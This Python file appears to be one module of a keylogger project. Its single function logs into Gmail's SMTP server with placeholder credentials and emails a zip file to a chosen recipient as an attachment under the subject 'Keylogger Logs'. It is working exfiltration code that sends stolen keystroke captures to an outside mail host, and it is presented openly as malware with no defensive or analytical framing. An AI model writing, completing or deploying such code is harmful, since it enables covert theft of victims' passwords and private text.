import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders

def send_email(zip_filename):
    # Sender and recipient email addresses
    from_address = " " # Write senders email address
    to_address = " " #Write receviers email address

    # Gmail SMTP server details
    smtp_server = "smtp.gmail.com"
    smtp_port = 587

    # Sender's credentials (you might want to use environment variables instead of hardcoding the values)
    username = " " #Write senders email address
    password = " " #Write senders application specific password

    # Create a multipart message and set the headers
    message = MIMEMultipart()
    message["From"] = from_address
    message["To"] = to_address
    message["Subject"] = "Keylogger Logs"

    # Add the zip file as an attachment to the email
    with open(zip_filename, "rb") as attachment:
        part = MIMEBase("application", "octet-stream")
        part.set_payload(attachment.read())
        encoders.encode_base64(part)
        part.add_header(
            "Content-Disposition",
            f"attachment; filename= {zip_filename}",
        )
        message.attach(part)

    # Connect to the SMTP server and send the email
    with smtplib.SMTP(smtp_server, smtp_port) as server:
        server.starttls()
        server.login(username, password)
        server.send_message(message)

